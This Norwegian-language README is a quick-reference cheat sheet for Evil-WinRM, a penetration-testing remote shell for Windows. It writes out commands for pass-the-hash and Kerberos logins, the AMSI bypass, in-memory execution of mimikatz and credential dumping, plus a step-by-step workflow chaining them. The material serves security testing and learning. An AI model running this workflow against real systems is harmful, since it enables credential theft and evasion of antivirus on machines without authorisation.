# 😈 Evil-WinRM – fjernskall for Windows

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Forutsetninger:** WinRM må være tilgjengelig, og kontoen må ha tilgang til det aktuelle endepunktet. En vellykket pålogging gir kontoens egne rettigheter. HTTP-porten 5985 betyr ikke nødvendigvis at selve PowerShell-kommunikasjonen er ukryptert; autentiseringsmåten er relevant. [Microsoft: WinRM-sikkerhet](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity).
>
> **Versjons- og eksempelmerknad:** Den offisielle alternativlisten angir `-H` som NT-hash og har ikke `-d` som domeneflagg. `-e` er lokal mappe for C#-programmer, ikke automatisk filopplasting. `Invoke-Binary` gjelder .NET-assemblier; en vilkårlig native exe-fil er ikke et gyldig tilsvarende eksempel. `-S` angir SSL og dokumenterer ikke alene sertifikatverifisering. AMSI-eksemplene innebærer ingen generell garanti mot antivirus. Opprinnelige kommandoer er beholdt. [Evil-WinRM-dokumentasjonen](https://github.com/Hackplayers/evil-winrm).

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 Det ultimate WinRM-skallet
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Evil-WinRM](#-hva-er-evil-winrm)
- [Installasjon](#-installasjon)
- [Grunnleggende tilkobling](#-grunnleggende-tilkobling)
- [Filoperasjoner](#-filoperasjoner)
- [Innebygde kommandoer](#-innebygde-kommandoer)
- [Pass-the-Hash](#-pass-the-hash)
- [Kerberos-autentisering](#-kerberos-autentisering)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er Evil-WinRM

**Evil-WinRM** er et WinRM-skall med funksjoner for sikkerhetstesting:

- 🖥️ **Interaktivt skall** – Full PowerShell-økt
- 📁 **Filoverføring** – Last opp og ned filer
- 🔓 **Pass-the-Hash** – Autentisering med NTLM-hash
- 🎫 **Kerberos** – Billettbasert autentisering
- 🧩 **Moduler** – Last inn PowerShell-skript

### WinRM-porter

| Port | Protokoll | Merknader |
|------|----------|-------|
| 5985 | HTTP | Standard |
| 5986 | HTTPS | Kryptert |

---

## 🚀 Installasjon

### Kali Linux

```bash
# Installer
sudo apt update
sudo apt install evil-winrm

# Eller via gem
sudo gem install evil-winrm
```

### Fra GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

## 💻 Grunnleggende tilkobling

### Passordautentisering

```bash
# Grunnleggende tilkobling
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Angi domene
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (port 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Angi port
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### SSL-alternativer

```bash
# SSL uten sertifikatverifisering
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Med sertifikat
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

## 📁 Filoperasjoner

### Last opp filer

```bash
# Inne i Evil-WinRM-skallet
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Last opp til bestemt plassering
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Fra kommandolinjen (med -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Last ned filer

```bash
# Last ned fil
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Last ned til bestemt plassering
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Mappe for kjørbare filer

```bash
# Angi exe-mappe for opplasting
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Inne i skallet: last opp en exe-fil fra denne mappen
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="-innebygde-kommandoer"></a>
## 🛠️ Innebygde kommandoer

### Meny

```bash
# Vis alle kommandoer
*Evil-WinRM* PS C:\> menu

# Tilgjengelige kommandoer:
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

### Omgå AMSI

```bash
# Omgå AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Nå kan du kjøre verktøy som antivirus oppdager
```

### Last inn skript

```bash
# Koble til med skriptmappe
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Last inn skript inne i skallet
*Evil-WinRM* PS C:\> PowerView.ps1

# Bruk funksjoner fra skript
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Kjør binærfiler

```bash
# Last inn mappe for kjørbare filer
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Kjør binærfil i minnet
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Med argumenter
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Innlasting av DLL

```bash
# Last inn DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Tjenester

```bash
# List tjenester
*Evil-WinRM* PS C:\> services
```

---

## 🔓 Pass-the-Hash

### NTLM-hash

```bash
# Koble til med hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Bare NTLM-delen
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Med domene
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

## 🎫 Kerberos-autentisering

### Oppsett

```bash
# Sett KRB5CCNAME til billettbufferen
export KRB5CCNAME=/path/to/ticket.ccache

# Rediger /etc/krb5.conf for realm
```

### Koble til med Kerberos

```bash
# Kerberos-autentisering
evil-winrm -i dc01.domain.local -r domain.local

# Med bestemt ccache
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

## 📊 Hurtigreferanse

### Tilkoblingsalternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `-i` | Målets IP/vertsnavn |
| `-u` | Brukernavn |
| `-p` | Passord |
| `-H` | NTLM-hash |
| `-d` | Domene |
| `-S` | Bruk SSL (HTTPS) |
| `-P` | Port |
| `-r` | Kerberos-realm |

### Filalternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `-s` | Skriptmappe |
| `-e` | Mappe for kjørbare filer |
| `-c` | SSL-sertifikat |
| `-k` | SSL-nøkkel |

### Skallkommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `upload` | Last opp fil |
| `download` | Last ned fil |
| `menu` | Vis kommandoer |
| `Bypass-4MSI` | Omgå AMSI |
| `Invoke-Binary` | Kjør exe i minnet |
| `services` | List tjenester |
| `Dll-Loader` | Last inn DLL |

### Vanlig arbeidsflyt

```bash
# 1. Koble til
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Omgå AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Last opp verktøy
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Kjør
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Last ned resultater
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Ressurser

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [WinRM-dokumentasjon](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Relaterte hurtigreferanser
- [CrackMapExec](../../CrackMapExec/translations/README.nb.md)
- [Impacket](../../Impacket/translations/README.nb.md)
- [Mimikatz](../../Mimikatz/translations/README.nb.md)

---

<p align="center">
  <b>😈 Det ultimate WinRM-skallet!</b><br>
  <i>Evil-WinRM – ta kontroll over Windows med stil</i>
</p>
